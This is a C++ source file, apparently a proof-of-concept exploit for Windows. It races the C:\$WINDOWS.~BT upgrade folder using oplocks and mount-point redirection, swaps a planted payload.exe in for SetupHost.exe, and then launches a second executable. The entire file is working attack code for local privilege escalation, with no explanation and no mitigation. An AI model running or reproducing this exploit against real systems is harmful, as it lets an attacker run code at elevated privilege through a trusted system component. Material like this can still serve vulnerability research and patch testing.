#include "stdafx.h"
#include "ReparsePoint.h"
#include "FileOpLock.h"
#include <windows.h>
#include <iostream>
#include <shlobj.h>
#include <conio.h>
#include <windows.h>
#include <ctime>
#include <wchar.h>
#include <io.h>
#include <process.h>
#include <cstdlib>
#include <string.h>
#include <stdio.h>
#include <random>
#include <cstdio>
#include <pathcch.h>
#include <AclAPI.h>
#include <Tlhelp32.h>
#include <string>
#include <fstream>
#include <Shlwapi.h>
#define FULL_SHARING FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE
#pragma comment(lib, "pathcch.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma warning(disable : 4996) //silence some compiler warning

using std::cout;
using std::endl;
using std::cin;
using std::wcout;
using std::wstring;
using std::string;

HANDLE bt;

void cb0() {
	CreateDirectory(L"C:\\asmae", NULL);
	ReparsePoint::CreateMountPoint(bt, L"C:\\asmae", L"");
}
void cb1() {}

int main(int argc, char* argv[]) {
	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	do {
		bt = CreateFile(L"C:\\$WINDOWS.~BT", GENERIC_READ | FILE_WRITE_DATA | DELETE, FULL_SHARING, NULL, OPEN_EXISTING,
			FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_OVERLAPPED, NULL);
	} while (bt == INVALID_HANDLE_VALUE);
	FileOpLock* btlock = FileOpLock::CreateLock(bt, cb0);
	if (btlock != nullptr) {
		btlock->WaitForLock(INFINITE);
		delete btlock;
	}
	ReparsePoint::DeleteMountPoint(L"C:\\$WINDOWS.~BT");
	do {
		bt = CreateFile(L"C:\\$WINDOWS.~BT\\Sources\\SetupHost.Exe", GENERIC_READ, FULL_SHARING, NULL, OPEN_EXISTING,
			FILE_FLAG_OVERLAPPED, NULL);
	} while (bt == INVALID_HANDLE_VALUE);
	btlock = FileOpLock::CreateLock(bt, cb1);
	if (btlock != nullptr) {
		btlock->WaitForLock(INFINITE);
		delete btlock;
	}
	do {} while (!CopyFile(L"C:\\poc\\payload.exe", L"C:\\$WINDOWS.~BT\\Sources\\SetupHost.Exe", FALSE));
	system("c:\\poc\\sad.exe");
	return 0;
}
